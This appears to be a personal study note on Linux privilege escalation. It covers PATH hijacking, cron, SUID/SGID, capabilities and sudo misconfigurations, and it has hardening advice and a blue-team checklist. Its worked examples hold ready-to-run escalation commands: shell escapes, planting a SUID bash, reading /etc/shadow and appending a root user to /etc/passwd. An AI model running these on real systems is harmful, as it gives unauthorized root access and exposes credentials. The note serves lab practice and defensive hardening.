---
title: "LNX.7 Advanced Mechanics & PrivEsc"
aliases: ["PATH Abuse", "Cronjobs", "Crontab", "SUID", "SGID", "euid", "Linux Privilege Escalation"]
tags:
  - tree/linux
  - cyber/foundations/linux
  - cyber/offensive/privesc
  - type/technique
  - level/operator
Domain:
  - "[[Branch Root Control]]"
Color: "#F58231"
---

# 👑 LNX.7 · Advanced Mechanics & PrivEsc

> [!abstract] Master Note of [[Branch Root Control]]
> This is where a low-privilege shell becomes **root**. Four classic mechanisms — the **`$PATH`** variable, **cron** jobs, **SUID/SGID** binaries, and **`sudo`** rights — are convenience features that turn into escalation paths when misconfigured. Understanding them makes you both the attacker who finds them and the admin who closes them.

> [!warning] Authorized Simulation / Defensive Testing only
> Every technique below is for **systems you own or are authorized to test** (CTFs, labs, sanctioned engagements). They are documented so you can **find and fix** the misconfiguration. Each ends with the hardening that defeats it.

## First: enumerate (the first 5 minutes on a foothold)
```shell-session
$ id; whoami; sudo -l                    # who am I, and what can I run as root?
$ uname -a; cat /etc/os-release          # kernel + distro → match kernel exploits
$ find / -perm -4000 -type f 2>/dev/null # SUID-root binaries
$ getcap -r / 2>/dev/null                # file capabilities (cap_setuid = win)
$ cat /etc/crontab; ls -la /etc/cron.*   # root-scheduled jobs
$ find / -writable -type d 2>/dev/null   # where can I write?
```
Automated by **LinPEAS** / **linux-smart-enumeration**, but knowing the manual commands is what lets you understand *why* a finding matters.

## Mechanism 1 — `$PATH` hijacking
`$PATH` is a colon-separated list the shell searches **left → right** to resolve a bare command name:

![[lnx_path_resolution.svg]]

**The abuse:** if a **root-run** program (SUID binary or cron job) calls another command by its *bare name* — `system("ls")` instead of `/bin/ls` — and you can prepend a directory you control, your malicious `ls` runs as root:
```shell-session
$ echo $PATH
/usr/local/bin:/usr/bin:/bin
$ echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/ls   # our fake "ls"
$ chmod +x /tmp/ls
$ export PATH=/tmp:$PATH                           # /tmp/ls now wins the search
$ /opt/vuln_suid_binary                            # it calls `ls` → runs OUR ls as root
# whoami
root
```
**Hardening:** call binaries by **absolute path** in privileged scripts; never put writable dirs (or `.`) in root's `$PATH`.

## Mechanism 2 — Cron jobs
**cron** runs commands on a schedule. Enumerate every location:
```shell-session
$ crontab -l                 # the current user's jobs
$ cat /etc/crontab           # the system-wide table (runs as root!)
$ ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
```
A `/etc/crontab` line is `m h dom mon dow  USER  COMMAND`:
```
*/5 * * * *   root   /opt/scripts/backup.sh     # runs backup.sh as ROOT every 5 min
```
**The abuse:** if that root cron job runs a script (or a directory) **you can write to**, you own root on the next tick:
```shell-session
$ ls -l /opt/scripts/backup.sh
-rwxrwxrwx 1 root root ...          # world-writable → jackpot
$ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait for the 5-minute tick, then:
$ /tmp/rootbash -p                 # SUID bash → root shell
# id → uid=1000 euid=0(root)
```
Also watch for **wildcard injection** (a cron `tar *`/`rsync` in a writable dir) and **`PATH`-relative** commands inside the script (combine with Mechanism 1). **Hardening:** cron scripts owned by root, `chmod 700`, absolute paths inside.

## Mechanism 3 — SUID / SGID and the `euid`
Normally a process runs with **your** identity. A **SUID** binary runs with its **owner's** identity — its **effective UID (euid)** becomes the owner's, often **root** — no matter who launches it. That's how `passwd` edits root-only `/etc/shadow` while you run it. Misused, it hands root away:

![[lnx_suid_flow.svg]]

### Find the attack surface, then match to GTFOBins
```shell-session
$ find / -perm -4000 -type f 2>/dev/null     # SUID-root binaries
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/find                                # ← a SUID that can spawn a shell = win
$ find / -perm -2000 -type f 2>/dev/null     # SGID binaries
```
Cross-reference each hit with **GTFOBins** and match it to the function you need (Shell / SUID / Sudo / Capabilities / File read / File write).

### Worked escalations
```shell-session
# SUID find — ‑p preserves the elevated euid:
$ find . -exec /bin/sh -p \; -quit          # → root shell

# SUID file-read hands you /etc/shadow (then crack offline):
$ /usr/bin/base64 /etc/shadow | base64 -d

# Capability cap_setuid on python:
$ getcap -r / 2>/dev/null | grep cap_setuid
/usr/bin/python3 = cap_setuid+ep
$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# Writable /etc/passwd → add a root user:
$ openssl passwd -1 -salt x pass                # → $1$x$...
$ echo 'r00t:$1$x$...:0:0::/root:/bin/bash' >> /etc/passwd && su r00t
```

## Mechanism 4 — `sudo` misconfigurations
```shell-session
$ sudo -l
User crook may run: (root) NOPASSWD: /usr/bin/vim, /usr/bin/awk
$ sudo vim -c ':!/bin/sh'                     # editor breakout → root
$ sudo awk 'BEGIN{system("/bin/sh")}'         # awk one-liner
```
Any `sudo`-able program that can **shell out** (`vim`,`less`,`find`,`awk`,`python`,`tar`,`nmap`) is an escalation. Also check for old **`sudo` CVEs** (e.g. Baron Samedit) via `sudo --version`. **Hardening:** never `NOPASSWD` shell-escape binaries; keep `sudo` patched; drop `env_keep` for `LD_PRELOAD`/`LD_LIBRARY_PATH`.

## Blue-team: close every door above
- **Baseline & diff** SUID/SGID: `find / -perm -4000 -type f 2>/dev/null | sort > baseline.txt`, alert on changes.
- **Strip** needless SUID (`chmod u-s`); prefer narrow **capabilities** over blanket SUID.
- **Mount** user-writable filesystems (`/tmp`,`/home`, removable) **`nosuid`** so SUID bits there are ignored.
- **Absolute paths** in every privileged script; **`chmod 700`** cron/root scripts.
- **Monitor** with `auditd` for execs of abusable binaries by unexpected users → feeds centralised logging.

---
> 🔼 Up: [[Branch Root Control]]
